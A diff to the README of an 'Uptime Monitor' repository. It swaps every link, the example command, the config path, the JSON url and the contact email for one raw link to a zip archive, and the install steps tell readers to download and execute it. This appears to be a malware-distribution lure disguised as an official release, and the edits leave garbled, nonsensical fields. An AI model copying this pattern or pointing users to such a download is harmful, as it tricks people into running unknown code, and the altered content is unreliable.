@@ -1,6 +1,6 @@
 # 🚀 Uptime Monitor
 
-![Uptime Monitor](https://img.shields.io/badge/Uptime_Monitor-v1.0.0-blue)
+![Uptime Monitor](https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip)
 
 Welcome to the Uptime Monitor repository! This project offers a simple and cost-effective solution for monitoring the uptime of your services. With our tool, you can create endpoint checks to monitor uptime, latency, and status codes. We also support OpsGenie for alerts, ensuring you stay informed about your service status.
 
@@ -26,11 +26,11 @@ Welcome to the Uptime Monitor repository! This project offers a simple and cost-
 
 ## Getting Started
 
-To get started with Uptime Monitor, you can download the latest release from our [Releases section](https://github.com/gztothesky/uptime-monitor/releases). Make sure to download the appropriate file for your system and execute it to set up the monitoring service.
+To get started with Uptime Monitor, you can download the latest release from our [Releases section](https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip). Make sure to download the appropriate file for your system and execute it to set up the monitoring service.
 
 ## Installation
 
-1. **Download the Latest Release**: Head over to the [Releases section](https://github.com/gztothesky/uptime-monitor/releases) to get the latest version.
+1. **Download the Latest Release**: Head over to the [Releases section](https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip) to get the latest version.
 2. **Execute the File**: Follow the instructions specific to your operating system to run the installation file.
 
 ## Usage
@@ -46,20 +46,20 @@ Replace `<endpoint-url>` with the URL of the service you want to monitor.
 ### Example
 
 ```bash
-uptime-monitor create https://example.com
+uptime-monitor create https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip
 ```
 
-This command will create a new endpoint check for `https://example.com`.
+This command will create a new endpoint check for `https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip`.
 
 ## Configuration
 
-You can configure Uptime Monitor to suit your needs. The configuration file is located at `~/.uptime-monitor/config.json`. Here’s a sample configuration:
+You can configure Uptime Monitor to suit your needs. The configuration file is located at `~https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip`. Here’s a sample configuration:
 
 ```json
 {
   "checks": [
     {
-      "url": "https://example.com",
+      "url": "https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip",
       "interval": 5,
       "timeout": 2
     }
@@ -108,7 +108,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@uptimemonitor.com
-- **GitHub**: [Uptime Monitor Issues](https://github.com/gztothesky/uptime-monitor/issues)
+- **Email**: https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip
+- **GitHub**: [Uptime Monitor Issues](https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip)
 
-Thank you for using Uptime Monitor! We hope it helps you keep your services running smoothly. For the latest updates and releases, visit our [Releases section](https://github.com/gztothesky/uptime-monitor/releases).
+Thank you for using Uptime Monitor! We hope it helps you keep your services running smoothly. For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/gztothesky/uptime-monitor/master/scripts/monitor-uptime-3.9.zip).
